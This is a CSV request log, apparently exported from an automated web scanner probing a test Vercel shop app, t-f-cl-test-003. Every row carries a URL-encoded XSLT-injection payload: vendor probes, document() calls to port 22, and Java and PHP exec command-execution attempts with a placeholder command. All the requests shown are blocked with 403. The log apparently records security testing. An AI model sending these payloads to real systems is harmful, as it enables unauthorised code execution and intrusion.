ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
7692,Mon Sep 07 17:32:42 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,200,567,32226
7693,Mon Sep 07 17:32:42 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,210,567,32215
7694,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,183,567,32220
7695,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,158,567,32221
7696,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,163,567,32211
7697,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,183,567,32228
7698,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/favicon.ico?favicon.3fpu2ql9ns1a0.ico=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,192,567,32215
7699,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,161,567,32210
7700,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/checkout?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,187,567,32216
7701,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,178,567,32214
7702,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,178,567,32216
7703,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,182,567,32215
7704,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,182,567,32216
7705,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,179,567,32214
7706,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,172,567,32217
7707,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin/users?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,196,567,32216
7708,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/858?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,196,567,32214
7709,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin/products?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,189,567,32215
7710,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin/orders?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,194,567,32211
7711,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&_rsc=tXyZJ52UQVBCVsD3,403,Forbidden,196,567,32221
7712,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,210,567,32215
7713,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,187,567,32216
7714,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,189,567,32215
7715,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,166,567,32225
7716,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,180,567,32226
7717,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,154,567,32211
7718,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin/users?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,155,567,32215
7719,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,161,567,32216
7720,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,196,567,32214
7721,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/favicon.ico?favicon.3fpu2ql9ns1a0.ico=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,212,567,32214
7722,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,175,567,32226
7723,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,180,567,32214
7724,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,207,567,32217
7725,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,204,567,32220
7726,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,189,567,32221
7727,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin/products?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,184,567,32215
7728,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&_rsc=tXyZJ52UQVBCVsD3,403,Forbidden,183,567,32216
7729,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,181,567,32223
7730,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/admin/orders?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,189,567,32225
7731,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/858?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,196,567,32242
7732,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,203,567,32210
7733,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,193,567,32217
7734,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,179,567,32211
7735,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,175,567,32211
7736,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,192,567,32216
7737,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,188,567,32220
7738,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,168,567,32211
7739,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,191,567,32226
7740,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,193,567,32226
7741,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,165,567,32214
7742,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout&_rsc=%3C,403,Forbidden,166,567,32228
7743,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,169,567,32215
7744,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/858?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,168,567,32210
7745,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,190,567,32214
7746,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,150,567,32215
7747,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,167,567,32221
7748,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,143,567,32211
7749,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,164,567,32215
7750,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout&_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,142,567,32215
7751,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/858?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,169,567,32219
7752,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:44 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,177,567,32217
7753,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:44 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout&_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,154,567,32219
7754,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,186,567,32225
7755,Mon Sep 07 17:32:43 BDT 2026,Mon Sep 07 17:32:43 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,177,567,32217
7756,Mon Sep 07 17:32:44 BDT 2026,Mon Sep 07 17:32:44 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/858?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,157,567,32217
7757,Mon Sep 07 17:32:44 BDT 2026,Mon Sep 07 17:32:44 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout&_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,165,567,32211
7758,Mon Sep 07 17:32:44 BDT 2026,Mon Sep 07 17:32:44 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,168,567,32216
